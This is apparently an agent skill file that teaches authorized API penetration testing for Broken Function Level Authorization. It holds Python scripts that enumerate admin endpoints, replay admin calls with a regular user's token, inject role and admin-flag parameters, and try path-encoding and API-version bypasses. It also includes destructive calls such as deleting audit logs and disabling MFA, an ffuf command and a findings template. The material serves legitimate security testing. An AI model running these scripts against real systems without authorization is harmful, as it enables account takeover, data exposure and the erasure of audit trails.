---
name: exploiting-broken-function-level-authorization
description: >
  Tests APIs for Broken Function Level Authorization (BFLA) vulnerabilities where regular
  users can invoke administrative functions or access privileged API endpoints by directly
  calling them. The tester identifies admin and privileged endpoints, then attempts to access
  them with regular user credentials by manipulating HTTP methods, URL paths, and request
  parameters. Maps to OWASP API5:2023 Broken Function Level Authorization. Activates for
  requests involving BFLA testing, admin endpoint bypass, function-level access control
  testing, or API privilege escalation.
domain: cybersecurity
subdomain: api-security
tags: [api-security, owasp, authorization, bfla, privilege-escalation, access-control]
version: 1.0.0
author: mahipal
license: Apache-2.0
---
# Exploiting Broken Function Level Authorization

## When to Use

- Testing whether regular users can access administrative API endpoints by direct URL access
- Assessing APIs for vertical privilege escalation where users can invoke functions above their role
- Evaluating if API gateways and middleware consistently enforce function-level access controls
- Testing role-based access control (RBAC) implementation across all API endpoints and HTTP methods
- Validating that API documentation does not expose admin endpoint paths that lack authorization

**Do not use** without written authorization. BFLA testing involves attempting to execute administrative functions with unauthorized credentials.

## Prerequisites

- Written authorization specifying target API and administrative functions in scope
- Test accounts at multiple privilege levels: regular user, moderator, admin, super-admin
- API documentation (OpenAPI/Swagger spec) that may list admin endpoints
- Burp Suite Professional for request interception and manipulation
- Python 3.10+ with `requests` library
- Knowledge of common admin endpoint naming conventions

## Workflow

### Step 1: Administrative Endpoint Discovery

```python
import requests
import itertools

BASE_URL = "https://target-api.example.com"
regular_user_headers = {"Authorization": "Bearer <regular_user_token>"}
admin_headers = {"Authorization": "Bearer <admin_token>"}

# Common admin endpoint patterns
ADMIN_PATH_PATTERNS = [
    "/api/v1/admin",
    "/api/v1/admin/users",
    "/api/v1/admin/settings",
    "/api/v1/admin/config",
    "/api/v1/admin/logs",
    "/api/v1/admin/dashboard",
    "/api/v1/admin/reports",
    "/api/v1/admin/billing",
    "/api/v1/manage",
    "/api/v1/management",
    "/api/v1/internal",
    "/api/v1/internal/users",
    "/api/v1/system",
    "/api/v1/system/health",
    "/api/v1/console",
    "/api/v1/users/admin",
    "/api/v1/roles",
    "/api/v1/permissions",
    "/api/v1/audit",
    "/api/v1/audit/logs",
    "/api/internal/",
    "/admin/api/",
    "/management/api/",
    "/backoffice/api/",
]

# Administrative function patterns (POST/PUT/DELETE operations)
ADMIN_FUNCTIONS = [
    ("POST", "/api/v1/users", {"role": "admin"}),             # Create user with admin role
    ("PUT", "/api/v1/users/1/role", {"role": "admin"}),        # Change user role
    ("DELETE", "/api/v1/users/1002", None),                     # Delete another user
    ("POST", "/api/v1/settings", {"maintenance": True}),       # Modify system settings
    ("GET", "/api/v1/users?role=admin", None),                  # List admin users
    ("POST", "/api/v1/export/users", None),                     # Export user data
    ("POST", "/api/v1/users/1002/disable", None),               # Disable user account
    ("POST", "/api/v1/users/1002/reset-password", None),        # Force password reset
    ("PUT", "/api/v1/config/security", {"mfa_required": False}),# Disable security
    ("DELETE", "/api/v1/audit/logs", None),                     # Delete audit logs
]

# Phase 1: Discover accessible admin endpoints
print("Phase 1: Admin Endpoint Discovery")
for path in ADMIN_PATH_PATTERNS:
    for method in ["GET", "POST", "PUT", "DELETE", "PATCH"]:
        try:
            resp = requests.request(method, f"{BASE_URL}{path}",
                                  headers=regular_user_headers, timeout=5)
            if resp.status_code not in (401, 403, 404, 405):
                print(f"  [ACCESSIBLE] {method} {path} -> {resp.status_code}")
        except requests.exceptions.RequestException:
            pass
```

### Step 2: Role-Based Function Testing

```python
# Define roles and their expected access levels
ROLES = {
    "unauthenticated": {},
    "regular_user": {"Authorization": "Bearer <regular_token>"},
    "moderator": {"Authorization": "Bearer <moderator_token>"},
    "admin": {"Authorization": "Bearer <admin_token>"},
}

# Endpoints with expected minimum role requirement
ROLE_MATRIX = [
    # (method, endpoint, body, minimum_role)
    ("GET", "/api/v1/users/me", None, "regular_user"),
    ("GET", "/api/v1/users", None, "admin"),
    ("POST", "/api/v1/users", {"email":"x@y.com","name":"X","role":"user"}, "admin"),
    ("DELETE", "/api/v1/users/1002", None, "admin"),
    ("GET", "/api/v1/admin/settings", None, "admin"),
    ("PUT", "/api/v1/admin/settings", {"feature_flag": True}, "admin"),
    ("GET", "/api/v1/reports/financial", None, "admin"),
    ("POST", "/api/v1/users/1002/ban", None, "moderator"),
    ("GET", "/api/v1/audit/logs", None, "admin"),
    ("POST", "/api/v1/export/database", None, "admin"),
    ("PUT", "/api/v1/users/1002/role", {"role": "admin"}, "admin"),
]

ROLE_HIERARCHY = ["unauthenticated", "regular_user", "moderator", "admin"]

results = []
for method, endpoint, body, min_role in ROLE_MATRIX:
    min_index = ROLE_HIERARCHY.index(min_role)
    for role_name, role_headers in ROLES.items():
        role_index = ROLE_HIERARCHY.index(role_name)
        if role_index < min_index:  # This role should NOT have access
            resp = requests.request(method, f"{BASE_URL}{endpoint}",
                                  headers=role_headers, json=body, timeout=5)
            if resp.status_code not in (401, 403):
                results.append({
                    "endpoint": f"{method} {endpoint}",
                    "role_used": role_name,
                    "expected_min_role": min_role,
                    "status_code": resp.status_code,
                    "vulnerable": True
                })
                print(f"  [BFLA] {role_name} accessed {method} {endpoint} (requires {min_role}) -> {resp.status_code}")

print(f"\nTotal BFLA findings: {len(results)}")
```

### Step 3: HTTP Method Manipulation

```python
# Test if authorization is method-dependent
def test_method_based_bfla(endpoint, authorized_method="GET"):
    """Test if authorization only applies to certain HTTP methods."""
    methods = ["GET", "POST", "PUT", "PATCH", "DELETE", "HEAD", "OPTIONS", "TRACE"]

    print(f"\nTesting method-based BFLA on {endpoint}:")
    for method in methods:
        try:
            resp = requests.request(method, f"{BASE_URL}{endpoint}",
                                  headers=regular_user_headers,
                                  json={"test": True} if method in ("POST","PUT","PATCH") else None,
                                  timeout=5)
            status = "ACCESSIBLE" if resp.status_code not in (401, 403, 405) else "blocked"
            if status == "ACCESSIBLE":
                print(f"  [{status}] {method} {endpoint} -> {resp.status_code}")
        except requests.exceptions.RequestException:
            pass

# Admin endpoints to test
test_method_based_bfla("/api/v1/admin/users")
test_method_based_bfla("/api/v1/admin/settings")
test_method_based_bfla("/api/v1/users/1002")
```

### Step 4: Parameter-Based Privilege Escalation

```python
# Test if adding admin parameters to regular requests enables admin functions
privilege_escalation_tests = [
    # Test 1: Add role parameter to self-update
    {
        "name": "Self role elevation via profile update",
        "method": "PUT",
        "endpoint": "/api/v1/users/me",
        "body": {"name": "Test User", "role": "admin"},
    },
    # Test 2: Add admin flag
    {
        "name": "Admin flag injection",
        "method": "PUT",
        "endpoint": "/api/v1/users/me",
        "body": {"name": "Test User", "is_admin": True, "isAdmin": True, "admin": True},
    },
    # Test 3: Modify user ID in body to target other users
    {
        "name": "User ID substitution in body",
        "method": "PUT",
        "endpoint": "/api/v1/users/me",
        "body": {"id": 1, "user_id": 1, "role": "admin"},
    },
    # Test 4: Access admin function via regular endpoint with admin params
    {
        "name": "Hidden admin parameter",
        "method": "GET",
        "endpoint": "/api/v1/users?admin=true&debug=true&internal=true",
        "body": None,
    },
    # Test 5: Override tenant/organization
    {
        "name": "Tenant override",
        "method": "GET",
        "endpoint": "/api/v1/users",
        "body": None,
        "extra_headers": {"X-Tenant-Id": "admin-org", "X-Organization": "1"},
    },
]

for test in privilege_escalation_tests:
    extra = test.get("extra_headers", {})
    resp = requests.request(
        test["method"],
        f"{BASE_URL}{test['endpoint']}",
        headers={**regular_user_headers, **extra},
        json=test["body"],
        timeout=5
    )
    if resp.status_code in (200, 201, 204):
        print(f"[BFLA] {test['name']}: {resp.status_code}")
        # Check if role actually changed
        if "role" in test.get("body", {}):
            me_resp = requests.get(f"{BASE_URL}/api/v1/users/me",
                                  headers=regular_user_headers)
            if me_resp.status_code == 200:
                current_role = me_resp.json().get("role", "unknown")
                print(f"  Current role after exploit: {current_role}")
```

### Step 5: API Version and Path Traversal for Admin Access

```python
# Test if older or alternative API versions lack authorization
api_versions = ["v1", "v2", "v3", "v0", "beta", "alpha", "internal", "legacy", "staging"]
admin_paths = ["/admin/users", "/admin/settings", "/users", "/config"]

print("Testing API version bypass:")
for version in api_versions:
    for path in admin_paths:
        full_path = f"/api/{version}{path}"
        resp = requests.get(f"{BASE_URL}{full_path}",
                          headers=regular_user_headers, timeout=5)
        if resp.status_code not in (401, 403, 404):
            print(f"  [BYPASS] {full_path} -> {resp.status_code}")

# Test path-based bypass techniques
bypass_paths = [
    "/api/v1/admin/users",
    "/api/v1/Admin/users",          # Case variation
    "/api/v1/ADMIN/users",
    "/api/v1/%61dmin/users",        # URL encoding
    "/api/v1/./admin/users",        # Path traversal
    "/api/v1/admin/../admin/users", # Double path
    "/api/v1/;/admin/users",        # Semicolon insertion
    "/api/v1/admin/users.json",     # Extension addition
    "/api/v1/admin/users/",         # Trailing slash
]

for path in bypass_paths:
    resp = requests.get(f"{BASE_URL}{path}",
                       headers=regular_user_headers, timeout=5)
    if resp.status_code not in (401, 403, 404):
        print(f"  [PATH BYPASS] {path} -> {resp.status_code}")
```

## Key Concepts

| Term | Definition |
|------|------------|
| **BFLA** | Broken Function Level Authorization (OWASP API5:2023) - regular users can invoke administrative or privileged API functions without proper authorization checks |
| **Vertical Privilege Escalation** | Accessing functions or data restricted to a higher privilege level, such as regular user accessing admin endpoints |
| **RBAC** | Role-Based Access Control - authorization model where permissions are assigned to roles and roles are assigned to users |
| **Function-Level Authorization** | Access control checks that verify whether the authenticated user has permission to invoke a specific API function |
| **Admin Endpoint** | API endpoints intended only for administrative users, typically managing users, settings, audit logs, and system configuration |
| **Forced Browsing** | Directly accessing URLs that are not linked in the application but exist on the server, bypassing UI-level access restrictions |

## Tools & Systems

- **Burp Suite Professional**: Intercept requests as admin, then replay with regular user token to test function-level authorization
- **OWASP ZAP**: Forced Browse scanner to discover hidden administrative endpoints and test access control
- **Autorize (Burp Extension)**: Automated BFLA detection by replaying admin requests with regular user credentials
- **ffuf**: Endpoint discovery tool: `ffuf -u https://api.example.com/api/v1/FUZZ -w admin-endpoints.txt -H "Authorization: Bearer user_token"`
- **Nuclei**: Template-based scanner with BFLA detection templates for common frameworks

## Common Scenarios

### Scenario: SaaS Multi-Tenant API BFLA Assessment

**Context**: A SaaS platform has user, moderator, and admin roles. The API serves a React frontend that conditionally renders admin features based on the user's role. The backend API should enforce the same restrictions independently.

**Approach**:
1. Map admin endpoints from the frontend JavaScript bundle: search for `/admin/`, `/manage/`, and role-check conditionals
2. Discover 12 admin endpoints including user management, billing, feature flags, and audit logs
3. Test each admin endpoint with regular user token:
   - `GET /api/v1/admin/users` returns 200 with all user data (BFLA - read)
   - `PUT /api/v1/admin/users/1002/role` accepts role change (BFLA - write)
   - `DELETE /api/v1/audit/logs` returns 200 (BFLA - destructive)
4. Test method-based bypass: `GET /api/v1/admin/settings` returns 403, but `PUT /api/v1/admin/settings` returns 200
5. Find that the moderator role can access all admin endpoints except `DELETE /api/v1/admin/billing`
6. Discover `/api/v2/admin/users` exists without any authorization (shadow API version)

**Pitfalls**:
- Only testing GET requests on admin endpoints while missing BFLA in POST/PUT/DELETE methods
- Not discovering admin endpoints because they are not linked in the UI (requires endpoint enumeration)
- Assuming RBAC is enforced consistently because one admin endpoint returned 403
- Missing BFLA in internal/undocumented API endpoints not listed in the OpenAPI specification
- Not testing with all available role levels (moderator may have partial admin access)

## Output Format

```
## Finding: Regular Users Can Access Admin User Management API

**ID**: API-BFLA-001
**Severity**: Critical (CVSS 9.8)
**OWASP API**: API5:2023 - Broken Function Level Authorization
**Affected Endpoints**:
  - GET /api/v1/admin/users (read all users)
  - PUT /api/v1/admin/users/{id}/role (change user roles)
  - DELETE /api/v1/audit/logs (delete audit trail)
  - PUT /api/v1/admin/settings (modify system config)

**Description**:
The API does not enforce function-level authorization on administrative
endpoints. A regular user can directly call admin API endpoints and
execute administrative functions including user management, role changes,
system configuration, and audit log deletion. The frontend hides admin
features based on role, but the backend API does not enforce the same
restrictions.

**Proof of Concept**:
1. Authenticate as regular user: POST /api/v1/auth/login
2. Call admin endpoint: GET /api/v1/admin/users -> 200 OK (returns all 50,000 users)
3. Elevate own role: PUT /api/v1/admin/users/me/role {"role":"admin"} -> 200 OK
4. Delete audit logs: DELETE /api/v1/audit/logs -> 204 No Content

**Impact**:
Any authenticated user can take full administrative control of the
platform, access all user data, modify roles, change system configuration,
and delete audit logs to cover their tracks.

**Remediation**:
1. Implement RBAC middleware that checks user role before executing any admin function
2. Apply authorization at the route/controller level, not just the frontend
3. Use decorator/annotation-based authorization (e.g., @RequireRole("admin"))
4. Add automated BFLA tests to the CI/CD pipeline that test every endpoint with every role
5. Implement immutable audit logging that admin users cannot delete
```
